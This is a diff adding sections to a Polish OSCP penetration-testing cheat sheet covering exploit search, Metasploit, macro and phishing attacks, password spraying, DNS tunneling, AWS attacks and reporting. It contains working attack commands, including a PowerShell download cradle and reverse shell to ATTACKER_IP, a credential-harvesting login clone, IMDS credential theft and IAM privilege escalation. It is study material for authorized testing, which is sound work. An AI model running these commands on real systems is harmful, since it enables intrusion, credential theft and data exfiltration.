@@ -12,18 +12,20 @@
 | # | Faza | Co tu znajdziesz |
 |---|------|------------------|
 | [0](#0-setup--zmienne-robocze) | **Setup** | Zmienne robocze, konwencje |
-| [1](#1-recon--enumeration-rozpoznanie) | **Recon & Enumeration** | Nmap, web, DNS, SMB, SNMP, LDAP, RPC, AD user enum, hydra |
-| [2](#2-initial-access--exploitation-uzyskanie-dostepu) | **Initial Access / Exploitation** | SQLi, LFI/RFI, upload, cmd injection, SSTI, XSS, SQLMap, reverse shells, TTY |
+| [1](#1-recon--enumeration-rozpoznanie) | **Recon & Enumeration** | Nmap, web, DNS, SMB, SNMP, LDAP, RPC, AD user enum, hydra, vuln scan (NSE/Nessus) |
+| [2](#2-initial-access--exploitation-uzyskanie-dostepu) | **Initial Access / Exploitation** | SQLi, LFI/RFI, upload, cmd injection, SSTI, XSS, SQLMap, reverse shells, TTY, exploity, Metasploit, client-side |
 | [3](#3-post-exploitation--situational-awareness) | **Situational Awareness** | Rozpoznanie lokalne Linux / Windows |
 | [4](#4-privilege-escalation-eskalacja-uprawnien) | **Privilege Escalation** | Linux (SUID/sudo/cron/caps) i Windows (services/DLL/registry) |
-| [5](#5-credential-access-pozyskiwanie-poswiadczen) | **Credential Access** | John, hashcat, mimikatz, Kerberos, Responder, NTLM relay |
+| [5](#5-credential-access-pozyskiwanie-poswiadczen) | **Credential Access** | John, hashcat, *2john, spraying, mimikatz, Kerberos, Responder, NTLM relay |
 | [6](#6-active-directory) | **Active Directory** | BloodHound, PowerView, net/wmic, MSSQL |
 | [7](#7-lateral-movement-ruch-boczny) | **Lateral Movement** | PsExec/WinRM/sc/WMI, PtH/PtT/PtK, RDP hijack |
-| [8](#8-pivoting--port-forwarding) | **Pivoting** | SSH tunnels, socat, chisel, proxychains |
+| [8](#8-pivoting--port-forwarding) | **Pivoting** | SSH tunnels, socat, chisel, proxychains, DPI/DNS tunneling (dnscat2) |
 | [9](#9-exfiltration--file-transfer) | **Exfiltration & Transfer** | Przerzucanie plików w obie strony |
 | [10](#10-persistence--backdooring) | **Persistence** | Backdoory, scheduled tasks |
 | [11](#11-blue-team--forensics) | **Blue Team / Forensics** | Detekcja, ausearch, analiza plików Windows |
 | [12](#12-toolbox--reference) | **Toolbox** | grep, awk, find, xxd, git i inne narzędzia bazowe |
+| [13](#13-cloud--aws-enumeracja-i-atak) | **Cloud (AWS)** | S3, IAM, EC2, Lambda — enumeracja i eskalacja w chmurze |
+| [14](#14-reporting--technical-report) | **Reporting** | Notatki, struktura raportu, PoC, remediation, walkthrough |
 | [A](#appendix-a--skroty-klawiszowe-shell) | **Appendix A** | Skróty klawiszowe shella |
 | [B](#appendix-b--oscp-exam-playbook--metodyka) | **Appendix B** | OSCP exam playbook — metodyka, checklisty, pułapki |
 
@@ -247,6 +249,32 @@ hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.
 username-anarchy Jan Kowalski > users.txt
 ```
 > 💡 Własne skrypty pomocnicze masz w `./Scripts/` (LFI scanner, RPC enum, session bruteforce, php_mt_seed, PadBuster do padding oracle).
+
+## 1.10 Vulnerability scanning (skanery + NSE)
+
+> Skanery automatyzują dopasowanie „wersja usługi → znane CVE”. Traktuj wynik jako **trop, nie dowód** — zawsze weryfikuj ręcznie (false-positive/negative). Na OSCP: automaty jako uzupełnienie enumeracji, nigdy zamiast niej.
+
+### Nmap NSE — skrypty vuln
+```bash
+ls /usr/share/nmap/scripts | grep -i vuln           # co jest dostępne lokalnie
+grep '"vuln"' /usr/share/nmap/scripts/script.db      # skrypty z kategorii vuln
+sudo nmap -sV -p 443 --script "vuln" $IP             # cała kategoria vuln (głośne, intrusive)
+sudo nmap -sV --script "http-vuln*" $IP              # wybrany zestaw po nazwie
+sudo nmap -sV --script vulners $IP                   # vulners: wersja → CVE + linki do exploitów
+```
+### Dodanie własnego skryptu NSE (np. świeży CVE z GitHuba)
+```bash
+sudo cp http-vuln-cve2021-41773.nse /usr/share/nmap/scripts/
+sudo nmap --script-updatedb                          # przebuduj bazę skryptów
+sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" $IP
+```
+### Nessus (GUI, kompleksowy skaner)
+```bash
+sudo dpkg -i Nessus-*.deb        # instalacja z .deb (Kali)
+sudo systemctl start nessusd     # start usługi
+# konfiguracja: https://kali:8834/  → New Scan → Basic Network Scan → podaj zakres IP
+```
+> Inne skanery: **nikto** (web) `nikto -h http://$IP`, **wpscan** (WordPress) `wpscan --url http://$IP`, **nuclei** (szablony CVE) `nuclei -u http://$IP`.
 
 ---
 
@@ -565,6 +593,160 @@ export TERM=xterm; export SHELL=bash
 stty rows 38 columns 116
 ```
 
+## 2.12 Locating & fixing public exploits
+
+> Zanim uruchomisz cudzy exploit — **przeczytaj kod**. Publiczne PoC bywają celowo złośliwe (ukryty destrukcyjny payload w hex) albo po prostu psują cel. Dekoduj każdy „shellcode”/hex, zanim zaufasz.
+
+### Szukanie
+```bash
+searchsploit apache 2.4.49                # szukaj po nazwie/wersji
+searchsploit -t oracle windows            # -t = tylko w tytule
+searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
+searchsploit -m 42341                     # -m = skopiuj (mirror) exploit do CWD
+searchsploit -p 39446                     # -p = pełna ścieżka + URL exploit-db
+ls /usr/share/exploitdb/exploits          # lokalne repo exploit-db
+```
+> Źródła online: **exploit-db.com**, **github.com** (`site:github.com <produkt> <wersja> exploit`), **packetstorm**, **nvd.nist.gov** (CVE→opis), **vulners.com**.
+
+### Weryfikacja PoC przed uruchomieniem
+```bash
+# Ukryty payload w hex? Zdekoduj do czytelnej postaci, ZANIM odpalisz:
+python3 -c 'print(bytes.fromhex("726d202d7266"))'    # → pokaże co naprawdę robi „shellcode”
+```
+> Czerwone flagi w PoC: `rm -rf`, `curl|bash` na obcy host, zaciemniony base64/hex, socket wychodzący poza cel. Testuj w izolowanej VM/wine, nie na swoim Kali produkcyjnym.
+
+### Poprawianie / kompilacja exploitów
+```bash
+# Cross-kompilacja C dla Windows na Kali:
+sudo apt install mingw-w64
+i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32   # -lws2_32 gdy używa Winsock (WSAStartup/socket)
+wine exploit.exe                                       # bezpieczny test na Kali
+# Regeneracja shellcode dla BOF (podmień zmienną 'shellcode' w PoC):
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread \
+  -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"         # -b = zakazane znaki (bad chars)
+```
+> Typowe zmiany w PoC: IP/port atakującego, ścieżka/URL celu, offset i adres powrotu (`JMP ESP`), payload (`<?php system($_GET['cmd']);?>` dla webshelli). Exploity webowe uruchamiasz po edycji zwykle: `python2 exploit_modified.py`, potem `curl -k https://$IP/uploads/shell.php?cmd=whoami`.
+
+## 2.13 Metasploit Framework (MSF)
+
+> Framework spinający recon → exploit → post-exploit → pivot. Na OSCP: **limit 1 użycia MSF na maszynę standalone** (przemyśl, gdzie go zużyjesz); w zestawie AD zwykle bez ograniczeń — sprawdź aktualny Exam Guide.
+
+### Start i baza
+```bash
+sudo msfdb init          # inicjalizacja bazy postgres (raz)
+sudo msfconsole          # start
+```
+```
+db_status                # sprawdź połączenie z bazą
+workspace -a pen200      # nowy workspace (izoluj projekty)
+db_nmap -A $IP           # nmap z zapisem wyników do bazy
+hosts                    # hosty w bazie
+services -p 445          # usługi (filtr po porcie)
+```
+### Moduły — search / use / options / run
+```
+search type:exploit apache 2.4.49
+search type:auxiliary smb          # skanery / enum
+use 0                              # wybierz po indeksie z ostatniego search
+use exploit/windows/smb/psexec     # albo po pełnej nazwie
+show options                       # wymagane parametry
+set RHOSTS $IP
+set LHOST tun0                     # możesz podać interfejs zamiast IP
+set LPORT 443
+run                                # lub: exploit   (exploit -j = w tle jako job)
+```
+> `setg` ustawia zmienną GLOBALNIE dla wszystkich modułów (`setg RHOSTS $IP`). `services -p 445 --rhosts` wrzuca hosty z bazy do RHOSTS.
+
+### Payloady — staged vs non-staged
+```
+show payloads                      # kompatybilne z wybranym exploitem
+set payload windows/x64/meterpreter/reverse_tcp   # staged (meterpreter)
+set payload linux/x64/shell_reverse_tcp           # non-staged (zwykły shell)
+```
+> **Staged** (`/meterpreter/reverse_tcp`) = mały stager dociąga resztę. **Non-staged** (`_reverse_tcp` bez `/`) = cały payload naraz — stabilniejszy przez proxy/tunel.
+
+### Multi/handler — listener pod payload z msfvenom
+```
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 443
+run -j                             # w tle; jobs = lista, kill <id> = zabij
+```
+### Meterpreter — post-exploitation
+```
+sysinfo ; getuid                   # kim / gdzie jestem
+ps ; migrate <PID>                 # przeskocz do stabilnego procesu (np. explorer.exe)
+getsystem                          # próba eskalacji do SYSTEM (Windows)
+hashdump                           # dump SAM (po SYSTEM)
+load kiwi                          # mimikatz wewnątrz meterpretera
+download /etc/passwd               # pobierz plik z celu
+upload winpeas.exe C:\Temp\        # wgraj na cel
+shell                              # zejście do natywnego shella
+background                         # (Ctrl+Z) → wróć do msf, sesja żyje
+```
+```
+sessions -l                        # lista sesji
+sessions -i 2                      # wejdź do sesji 2
+sessions -u 1                      # UPGRADE zwykłego shella → meterpreter
+```
+### Local exploity / bypass UAC
+```
+search UAC
+use exploit/windows/local/bypassuac_sdclt
+set SESSION 1
+run
+```
+### Pivoting przez MSF (autoroute + SOCKS)
+```
+use post/multi/manage/autoroute    # dodaj trasy do wewn. podsieci przez sesję
+set session 1
+run                                # ręcznie: route add 172.16.5.0/24 1
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j                             # SOCKS5 na 127.0.0.1:1080 → proxychains
+```
+### Resource scripts (automatyzacja)
+```bash
+msfconsole -r handler.rc           # uruchom komendy z pliku (.rc)
+# w konsoli: makerc /tmp/setup.rc   # zapisz historię komend jako skrypt
+```
+
+## 2.14 Client-side attacks & phishing (koncepcja)
+
+> ⚠️ Tylko w ramach **autoryzowanego** zaangażowania / labu. Cel: skłonić UŻYTKOWNIKA do uruchomienia kodu, gdy nie ma podatnej usługi sieciowej. Wektory: dokumenty z makrami, pliki HTA/LNK, sfałszowane strony logowania.
+
+### Fingerprinting klienta
+```bash
+exiftool -a -u brochure.pdf         # metadane pliku → wersje software'u ofiary
+# Serwuj stronę-pułapkę i czytaj User-Agent z logów, by dobrać exploit do przeglądarki/OS.
+```
+### Makro Office (VBA) — download & execute
+> Szkielet: `Sub AutoOpen()` / `Sub Document_Open()` odpalają makro przy otwarciu pliku `.docm`. Makro uruchamia PowerShell z **download-cradle** (pobierz skrypt z Kali i wykonaj w pamięci):
+```powershell
+IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 4444 -e powershell
+```
+> Analiza podejrzanych makr (blue-team / weryfikacja): `olevba dokument.docm`.
+
+### Dostawa payloadu przez WebDAV / HTTP
+```bash
+sudo apt install python3-wsgidav
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/   # share WebDAV
+python3 -m http.server 80            # albo zwykły HTTP do download-cradle
+nc -nvlp 4444                        # listener na reverse shell
+```
+### Phishing poświadczeń (koncepcja)
+> Sklonuj stronę logowania, podmień `action` formularza na własny serwer, hostuj, zbieraj wpisane dane:
+```bash
+wget -E -k -K -p -e robots=off -nd "https://przyklad.com/signin"    # zapisz stronę + zasoby
+single-file "https://przyklad.com/signin" signin.html \
+  --browser-executable-path /usr/bin/chromium                       # wierniejsza kopia SPA
+# w signin.html: <form action="http://ATTACKER_IP:8080/creds" method="POST">
+sudo python3 -m http.server 80       # hostuj klon; własny cred_server.py loguje POST /creds
+```
+> Wariant bez klonu: wymuś uwierzytelnienie NTLM (odwołanie do `\\ATTACKER_IP\share` w mailu/pliku) i przechwyć hash Responderem (§5.4). Zawsze w granicach zgody klienta.
+
 ---
 
 # 3. Post-Exploitation — Situational Awareness
@@ -853,6 +1035,23 @@ hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt    # -m = typ hasha
 hashcat --example-hashes | grep -iA2 "ntlm"             # gdy nie znasz numeru -m
 ```
 > Identyfikacja typu hasha przed łamaniem: `hashid '<hash>'` lub `nth --text '<hash>'`.
+
+### Ekstrakcja hasha z pliku (`*2john`)
+```bash
+ssh2john id_rsa > ssh.hash             # zaszyfrowany klucz prywatny SSH → hash
+keepass2john Database.kdbx > kp.hash   # baza KeePass → hash
+zip2john plik.zip > zip.hash           # (analogicznie: office2john, gpg2john, pdf2john)
+hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt -r ssh.rule   # klucz SSH
+hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule   # KeePass
+```
+> Dodatkowe tryby `-m`: **13400** KeePass · **22921** klucz SSH · **11600** 7-Zip · **13600** ZIP · **9600** Office 2013+ · **7500** Kerberos AS-REQ (etype 23).
+
+### Password spraying (1 hasło × wielu userów)
+```bash
+crackmapexec smb $DC -u users.txt -p 'Sezon2024!' -d $DOMAIN --continue-on-success   # nxc = następca cme
+kerbrute passwordspray -d $DOMAIN users.txt 'Sezon2024!'          # przez Kerberos (ciszej)
+```
+> ⚠️ Uwaga na **lockout policy** — spray JEDNYM hasłem na rundę, z przerwami. Mutacje list haseł: `hashcat --stdout wordlist.txt -r best64.rule` albo `kwp` (kwprocessor, maski klawiaturowe).
 
 ## 5.2 Mimikatz (Windows, wymaga admina/SYSTEM)
 
@@ -1236,6 +1435,36 @@ netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow pr
 ```
 > Alternatywa premium: **ligolo-ng** (tworzy interfejs tun, nie potrzebujesz proxychains).
 
+## 8.4 Tunneling przez DPI (gdy filtrują ruch)
+
+> Gdy firewall/DPI przepuszcza tylko HTTP(S) albo DNS — opakuj tunel w dozwolony protokół. Wolniejsze, ale przechodzi.
+
+### chisel przez HTTP (SOCKS w WebSocket)
+```bash
+# Kali (server, reverse):
+chisel server --port 8080 --reverse
+# Na celu (client) — R:socks tworzy reverse SOCKS5 na 127.0.0.1:1080 u Ciebie:
+/tmp/chisel client ATTACKER_IP:8080 R:socks
+# Ruch wygląda jak zwykły HTTP/WebSocket (podejrzyj: sudo tcpdump -nvi tun0 tcp port 8080).
+# Uwaga na wersję GLIBC na celu — dobierz statyczny/pasujący binarz chisela.
+proxychains nmap -sT 172.16.5.0/24    # potem przez socks5 127.0.0.1 1080
+```
+### DNS tunneling — dnscat2 (gdy wychodzi tylko DNS)
+```bash
+# Kali = autorytatywny NS dla kontrolowanej domeny (np. feline.corp):
+dnscat2-server feline.corp
+# Na celu (klient) — bezpośrednio lub przez lokalny resolver:
+./dnscat feline.corp
+./dnscat --dns server=ATTACKER_IP,port=53 --secret=<SECRET> feline.corp
+# W konsoli serwera:  windows → lista sesji ;  window -i 1 → wejdź ;  potem: shell / exec / listen
+```
+> Setup labowy testowego NS: `sudo dnsmasq -C dnsmasq.conf -d` z `auth-zone=feline.corp`. Alternatywa: **iodine** (interfejs tun po DNS).
+
+### SSH przez łańcuch SOCKS
+```bash
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.4.50.215
+```
+
 ---
 
 # 9. Exfiltration & File Transfer
@@ -1475,6 +1704,78 @@ git commit -m "Opis zmian"            # commit
 git push origin main                  # push
 git pull origin main                  # pull
 ```
+
+---
+
+# 13. Cloud — AWS (enumeracja i atak)
+
+> Coraz częściej cel to konto w chmurze, nie serwer. Fundament AWS: **S3** (storage), **IAM** (tożsamości/uprawnienia), **EC2** (VM), **Lambda** (funkcje). Klucz `AKIA...` + secret = tożsamość. Zawsze w granicach zakresu zaangażowania.
+
+## 13.1 Rozpoznanie bez kluczy (unauthenticated)
+```bash
+cloud_enum -k firma -k firma-prod                    # publiczne buckety S3 i inne zasoby wg nazwy firmy
+aws s3 ls s3://firma-assets-public --no-sign-request # anonimowy listing (gdy public)
+aws s3 cp s3://firma-assets-public/README.md ./ --no-sign-request
+curl http://firma-assets.s3.amazonaws.com/           # listing przez HTTP gdy bucket public
+```
+> SSRF na instancji EC2 → kradzież tymczasowych creds roli z IMDS: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<rola>`.
+
+## 13.2 Konfiguracja CLI z pozyskanymi kluczami
+```bash
+aws configure --profile target                       # wklej AKIA..., secret, region (np. us-east-1)
+aws --profile target sts get-caller-identity         # kim jestem (ARN, account id)
+aws --profile target sts get-access-key-info --access-key-id AKIA...   # do jakiego konta należy klucz
+```
+## 13.3 Enumeracja uprawnień (IAM) — dokąd mogę pójść
+```bash
+aws --profile target iam list-users
+aws --profile target iam list-groups
+aws --profile target iam list-roles
+aws --profile target iam list-attached-user-policies --user-name bob
+aws --profile target iam get-account-authorization-details    # PEŁNY zrzut IAM (users+groups+policies+roles)
+aws --profile target iam get-policy-version --policy-arn <ARN> --version-id v1
+```
+> Szukaj nadmiarowych uprawnień → ścieżki eskalacji: `iam:CreateAccessKey`, `iam:PutUserPolicy`, `iam:AttachUserPolicy`, `sts:AssumeRole`, `*:*`.
+
+## 13.4 Ruch dalej / eskalacja (przykłady)
+```bash
+# S3 — pobierz dane z prywatnych bucketów, do których masz dostęp:
+aws --profile target s3 ls firma-assets-private
+aws --profile target s3 sync s3://firma-assets-private ./loot
+# EC2 — cudze AMI / snapshoty (mogą zawierać sekrety):
+aws --profile target ec2 describe-images  --owners <acct> --executable-users all
+aws --profile target ec2 describe-snapshots --filters "Name=description,Values=*prod*"
+# Lambda — wylistuj i wywołaj funkcję:
+aws --profile target lambda invoke --function-name <arn> out.json
+# IAM privesc (gdy masz PutUserPolicy): dołóż sobie politykę admina:
+aws --profile target iam put-user-policy --user-name bob --policy-name pe --policy-document file://admin.json
+# Persistencja: nowy klucz dostępu do przejętego usera:
+aws --profile target iam create-access-key --user-name bob
+```
+> Automatyzacja audytu/ataku IAM: **Pacu**, **ScoutSuite**, **enumerate-iam**.
+
+---
+
+# 14. Reporting & Technical Report
+
+> Zaangażowanie kończy się **raportem** — to on ma wartość dla klienta (i punkty na OSCP: dodatkowe 24h na raport). Notuj OD RAZU, nie po fakcie.
+
+## 14.1 Notatki w trakcie
+> Zapisuj na bieżąco: komendy, output, screenshoty (z widocznym IP celu + `whoami`), znalezione creds. Narzędzia: **Obsidian**, **CherryTree**, **Sysreptor**, **Joplin**. Screeny trzymaj w jednym folderze per host.
+```bash
+# Szybki dowód na maszynie (do wklejenia w raport):
+hostname; whoami; ip a | grep inet          # Linux
+cat /root/proof.txt 2>/dev/null; cat /home/*/local.txt 2>/dev/null
+# Windows: type C:\Users\Administrator\Desktop\proof.txt & ipconfig & whoami
+```
+## 14.2 Struktura raportu (OSCP / komercyjny)
+> 1. **Executive Summary** — dla zarządu, bez żargonu: co, jak źle, co dalej.
+> 2. **Scope & Methodology** — zakres (IP/domeny), okno czasowe, podejście (PTES/OSSTMM).
+> 3. **Findings** — każde znalezisko: opis, **risk/CVSS**, dowód (**PoC** + screeny), **kroki reprodukcji**, **remediation** (konkretna rekomendacja).
+> 4. **Attack Narrative / Walkthrough** — chronologiczny łańcuch: enumeracja → exploit → privesc → lateral, krok po kroku. Kluczowe na OSCP — oceniający musi ODTWORZYĆ Twoją drogę.
+> 5. **Appendices** — pełne outputy, lista creds, użyte narzędzia.
+
+> ✍️ Zasady: każdy krok reprodukowalny; screeny czytelne (IP + proof widoczne); dla OSCP dołącz `local.txt`/`proof.txt` z każdej maszyny. Brak reprodukowalności = brak punktów, nawet gdy „miałeś” roota.
 
 ---
 
